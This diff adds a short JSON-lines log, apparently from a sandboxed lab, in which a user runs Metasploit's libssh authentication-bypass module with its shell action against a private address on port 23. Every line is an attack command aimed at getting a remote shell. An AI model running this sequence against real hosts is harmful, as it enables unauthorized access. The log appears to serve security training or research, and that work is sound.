@@ -1,0 +1,9 @@
+{"sandbox_id": "398", "timestamp_str": "2019-08-14T16:00:29.992498Z", "cmd_type": "msf-command", "cmd": "use auxiliary/scanner/ssh/libssh_auth_bypass "}
+{"sandbox_id": "398", "timestamp_str": "2019-08-14T16:00:34.201295Z", "cmd_type": "msf-command", "cmd": "show actions"}
+{"sandbox_id": "398", "timestamp_str": "2019-08-14T16:00:41.518582Z", "cmd_type": "msf-command", "cmd": "set ACTION shell"}
+{"sandbox_id": "398", "timestamp_str": "2019-08-14T16:00:44.085076Z", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "398", "timestamp_str": "2019-08-14T16:00:48.867231Z", "cmd_type": "msf-command", "cmd": "set ACTION Shell"}
+{"sandbox_id": "398", "timestamp_str": "2019-08-14T16:00:50.041648Z", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "398", "timestamp_str": "2019-08-14T16:00:58.517316Z", "cmd_type": "msf-command", "cmd": "set RHOSTS 172.18.1.5"}
+{"sandbox_id": "398", "timestamp_str": "2019-08-14T16:01:03.607364Z", "cmd_type": "msf-command", "cmd": "set RPORT 23"}
+{"sandbox_id": "398", "timestamp_str": "2019-08-14T16:01:07.033925Z", "cmd_type": "msf-command", "cmd": "run"}
